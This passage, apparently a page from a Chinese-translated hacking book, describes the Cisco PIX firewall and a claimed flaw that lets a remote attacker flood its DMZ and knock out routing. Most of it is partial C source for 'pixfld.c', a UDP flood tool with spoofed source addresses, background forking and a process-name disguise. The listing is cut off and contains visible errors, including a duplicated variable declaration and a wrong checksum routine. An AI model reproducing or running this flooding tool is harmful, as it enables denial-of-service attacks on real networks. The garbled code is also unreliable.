
# 526

## PIX

由思科系统公司（Cisco Systems, Inc.，www.cisco.com）提供的 `PIX`，在另一个易于安装的一体化硬件平台上提供了强大的安全性。提供完整的防火墙安全保护，`PIX` 防火墙使用非 UNIX、安全、实时的嵌入式系统。`PIX` 提供高达 256,000 个同时连接、每秒超过 6,500 个新连接以及接近 170 Mbps 吞吐量的出色性能。通过命令行界面或图形化管理器，`PIX` 允许从单一位置轻松配置和管理单个或多个 `PIX` 防火墙，每个防火墙保护多个网络（包括令牌环网）。`PIX` 可以支持六个接口，包括网络地址转换（`NAT`）。

## 局限性

当前关于 `PIX` 漏洞的最新秘密信息涉及 `PIX` 防火墙维护连接状态路由表的方式。基本上，远程攻击者可以对 `PIX` 的非军事区（`DMZ`）发起拒绝服务（`DoS`）攻击，从而使黑客能够重置整个路由表，有效地阻塞任何内部接口与外部接口之间的所有通信，反之亦然（参见 `pixfld.c`）。

## pixfld.c

```c
/*----------------------- [Defines] */
#define Port_Max 65534
#define Packet_Max 1023
#define Frequency_Max 300
#define Default_Fork 0
#define Default_Stealth "(nfiiod)"
/* Color Palette --------------- */
#define B "\033[1;30m"

#define R "\033[1;31m"
#define G "\033[1;32m"
#define Y "\033[1;33m"
#define U "\033[1;34m"
#define M "\033[1;35m"
#define C "\033[1;36m"
#define W "\033[1;37m"
#define DR "\033[0;31m"
#define DG "\033[0;32m"
#define DY "\033[0;33m"
#define DU "\033[0;34m"
#define DM "\033[0;35m"
#define DC "\033[0;36m"
#define DW "\033[0;37m"
#define RESTORE "\033[0;0m"
#define CLEAR "\033[0;0H\033[J"

/* ------------------- [Includes] */
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/protocols.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <netinet/ip_udp.h>
#include <string.h>
#include <pwd.h>
#include <time.h>

/* [Option Parsing] */

struct sockaddr_in dstaddr;

unsigned long dst;

struct udphdr *udp;
struct iphdr *ip;

char *target;
char *srchost;
char *stealth;
int dstport = 0;

int srchost = 0;
int numpacks = 0;
int psize = 0;
int wait = 0;
int forknum = 0;

/* [Usage] */

void usage(char *pname)
{
    printf("\n%sUsage%s %s: %s[%sarguments%s] %s<%sTarget Ip%s>\n\n", DG, R, pname, DM, U, DM, DM, U, DM, RESTORE);
    printf("%sOption Description Default Value\n\n",W,RESTORE);
    printf("%s-%ss %s<%sSource IP %s> %s: %sPacket Origin %s[%s Random %s ] \n", DR,DU,W,DC,W,DW,B,W,DC,W,RESTORE);
    printf("%s-%sn %s<%sPacket Num %s> %s: %sLimit of Sent Datagrams %s[%s Unlimited %s ] \n", DR,DU,W,DC,W,DW,B,W,DC,W,RESTORE);
    printf("%s-%sp %s<%sPacket Size%s> %s: %sDatagram Size %s[%s 1 - %d bytes%s ]\n", DR,DU,W,DC,W,DW,B,W,DC,Packet_Max,W,RESTORE);
    printf("%s-%sd %s<%sTarget Port%s> %s: %sDestination Port %s[%s Random %s ] \n", DR,DU,W,DC,W,DW,B,W,DC,W,RESTORE);
    printf("%s-%so %s<%sSource Port%s> %s: %sSource Port %s[%s Random %s ] \n", DR,DU,W,DC,W,DW,B,W,DC,W,RESTORE);
    printf("%s-%sw %s<%sFrequency %s> %s: %sDelay Between Each Packet %s[%s 0 - %d ms%s ]\n", DR,DU,W,DC,W,DW,B,W,DC,Frequency_Max,W,RESTORE);
    printf("%s-%sf %s<%sFork Number%s> %s: %sNo. of Times Backgrounded %s[%s 0 Times %s ]%s\n", DR,DU,W,DC,W,DW,B,W,DC,W,RESTORE);
    printf("%s-%sx %s<%sStealth %s> %s: %sMask Process As %s[%s %s %s]\n", DR,DU,W,DC,W,DW,B,W,DC,Default_Stealth,W,RESTORE);
    printf("\n\n");
    exit(EXIT_SUCCESS);
}

/* [In cksum with some mods] */
unsigned short in_cksum(addr, len)
u_short *addr;
int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

    while (nleft > 1) {
        sum += *w++;
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(u_char *) (&answer) = *(u_char *) w;
        sum += answer;
    }
    sum = (sum >> 17) + (sum & 0xffff);
    sum += (sum >> 17);
    answer = -sum;
```

## 解析函数
